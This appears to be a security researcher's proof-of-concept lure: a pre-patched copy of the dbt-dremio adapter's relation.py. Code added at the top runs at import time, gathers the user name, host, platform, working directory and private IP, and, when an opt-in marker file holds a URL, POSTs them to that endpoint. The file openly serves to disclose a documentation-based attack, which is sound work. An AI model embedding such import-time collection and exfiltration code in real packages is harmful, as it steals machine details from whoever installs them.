# SECURITY_POC_LURE — pre-patched dbt-dremio adapter (relation.py)
# =====================================================================
# RESEARCH PoC. This file models the "convenience asset" an attacker
# attaches to the official guide's step 2 (hand-editing the installed
# adapter's relation.py, per docs.getdbt.com/guides/build-dremio-lakehouse).
# The project + guide patch are applied ALREADY, so a victim can be talked
# into copying this file over their installed adapter instead of editing
# manually — and thereby runs attacker-authored Python at import time on
# every later dbt command.
#
# This PoC implementation is SAFE BY DEFAULT:
#   * prints a labeled context banner to the LOCAL terminal (stderr)
#   * performs NO network I/O by default: the only egress is the single-file
#     opt-in demo gate below ($HOME/.security_poc_demo), which the researcher
#     arms on their OWN machine for the disclosure video — the endpoint URL
#     is never stored in this repo, and every third-party machine (no marker
#     file) does nothing but print
#   * NO persistence, NO file writes (besides the one-shot marker deletion),
#     NO subprocess
#   * never breaks dbt: everything is wrapped in try/except and the adapter
#     logic below is functionally identical to upstream v1.5.0
#
# Base file provenance: dremio/dbt-dremio tag v1.5.0 —
# dbt/adapters/dremio/relation.py (Apache License 2.0, (C) 2022 Dremio Corp),
# carried as-is apart from the labeled additions above and the guide's
# documented two-line patch in quoted_by_component.
# =====================================================================

# Copyright (C) 2022 Dremio Corporation

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re

from dataclasses import dataclass, field
from dbt.adapters.base.relation import (
    BaseRelation,
    Policy,
    ComponentName,
)
from typing import Optional, Tuple, Iterator

# ==========================================================================
# SECURITY_POC import-time execution marker (benign, LOCAL-ONLY):
# executes for EVERY dbt command that loads the dremio adapter after this
# file replaces the victim's installed one — i.e., attacker-authored Python
# runs on the victim's machine before any dbt/SQL logic.
# ==========================================================================
import sys as _sys

try:  # never break dbt — the marker is inert by design
    import getpass as _getpass
    import os as _os
    import platform as _platform
    import socket as _socket

    _sys.stderr.write(
        "[SECURITY_POC] python: ATTACKER-CONTROLLED FILE executing at dbt adapter import "
        "(dremio-brock/DremioDBTSample via the official docs flow "
        "docs.getdbt.com/guides/build-dremio-lakehouse)\n"
        "[SECURITY_POC] python: local context — "
        "user=%s | host=%s | platform=%s | python=%s | cwd=%s\n"
        % (
            _getpass.getuser(),
            _socket.gethostname(),
            _platform.platform(),
            _sys.version.split()[0],
            _os.getcwd(),
        )
    )
    # -------------------------------------------------------------------
    # SECURITY_POC demo exfiltration — single-file opt-in gate.
    #
    # The endpoint URL is NEVER stored in this repo (a real attacker would
    # not publish their collector either, and the repo must not beacon
    # anyone). The gate arms ONLY on the researcher's own machine:
    #
    #   printf 'https://<YOUR-PIPEDREAM-HTTP-ENDPOINT>\n' > "$HOME/.security_poc_demo"
    #
    # While that marker file exists, this import-time position sends ONE
    # best-effort HTTPS POST with the machine's own LOCAL context (to the
    # URL held by the marker file), then DELETES the marker — one firing
    # per deliberate researcher action. Every third-party machine — none
    # of which has this marker — performs no network I/O at all, and dbt
    # behavior is unchanged either way. All failure paths are swallowed
    # so dbt never breaks.
    # -------------------------------------------------------------------
    _poc_marker_path = _os.path.join(_os.path.expanduser("~"), ".security_poc_demo")

    if _os.path.exists(_poc_marker_path):
        try:
            import json as _json
            import urllib.request as _ur

            with open(_poc_marker_path, "r", encoding="utf-8") as _fm:
                _poc_url = _fm.readline().strip()

            if _poc_url:
                try:
                    _private_ip = _socket.gethostbyname(_socket.gethostname())
                except Exception:
                    _private_ip = "unavailable"

                _payload = {
                    "poc_id": "SECURITY_POC_nvk0x_dangling_docs_reference_takeover",
                    "repo": "github.com/dremio-brock/DremioDBTSample",
                    "docs_source": "https://docs.getdbt.com/guides/build-dremio-lakehouse",
                    "machine_user": _getpass.getuser(),
                    "host": _socket.gethostname(),
                    "platform": _platform.platform(),
                    "python": _sys.version.split()[0],
                    "cwd": _os.getcwd(),
                    "imported_file": _os.path.abspath(__file__),
                    "private_ip": _private_ip,
                }

                _req = _ur.Request(
                    _poc_url,
                    data=_json.dumps(_payload).encode("utf-8"),
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                _ur.urlopen(_req, timeout=5).read()
                _sys.stderr.write(
                    "[SECURITY_POC] python: demo exfiltration event SENT to the "
                    "researcher's Pipedream endpoint (this machine's own context only)\n"
                )
        except Exception:
            pass
        finally:
            try:
                _poc_marker_deleted = _os.remove(_poc_marker_path)  # noqa: F841
            except OSError:
                _poc_marker_deleted = None
except Exception:
    pass


@dataclass
class DremioQuotePolicy(Policy):
    database: bool = True
    schema: bool = True
    identifier: bool = True


@dataclass
class DremioIncludePolicy(Policy):
    database: bool = True
    schema: bool = True
    identifier: bool = True


@dataclass(frozen=True, eq=False, repr=False)
class DremioRelation(BaseRelation):
    quote_policy: DremioQuotePolicy = field(default_factory=lambda: DremioQuotePolicy())
    include_policy: DremioIncludePolicy = field(
        default_factory=lambda: DremioIncludePolicy()
    )
    no_schema = "no_schema"
    format: Optional[str] = None
    format_clause: Optional[str] = None

    def quoted_by_component(self, identifier, componentName):
        if componentName == ComponentName.Schema:
            # SECURITY_POC: this is EXACTLY the two-line fix the official guide
            # instructs victims to apply by hand (guide step 2, "update lines 51
            # and 52") — pre-applied here, which is the lure's payload claim.
            PATTERN = re.compile(r"""((?:[^."']|"[^"]*"|'[^']*')+)""")
            return ".".join(PATTERN.split(identifier)[1::2])
        else:
            return self.quoted(identifier)

    def render(self) -> str:
        rendered = super().render()
        if self.format is not None and self.format_clause is not None:
            rendered = "".join(("table( ", rendered, " ( ", self.format_clause, " ) )"))
        return rendered

    def __post_init__(self):
        if self.path.schema is None:
            self.path.schema = DremioRelation.no_schema

    def _render_iterator(
        self,
    ) -> Iterator[Tuple[Optional[ComponentName], Optional[str]]]:

        for key in ComponentName:
            path_part: Optional[str] = None
            if self.include_policy.get_part(key):
                tmp_path_part = self.path.get_part(key)
                if not (
                    key == ComponentName.Schema and tmp_path_part == self.no_schema
                ):
                    path_part = tmp_path_part
                if path_part is not None and (
                    self.quote_policy.get_part(key)
                ):  # or key == ComponentName.Schema):
                    path_part = self.quoted_by_component(path_part, key)
            yield key, path_part
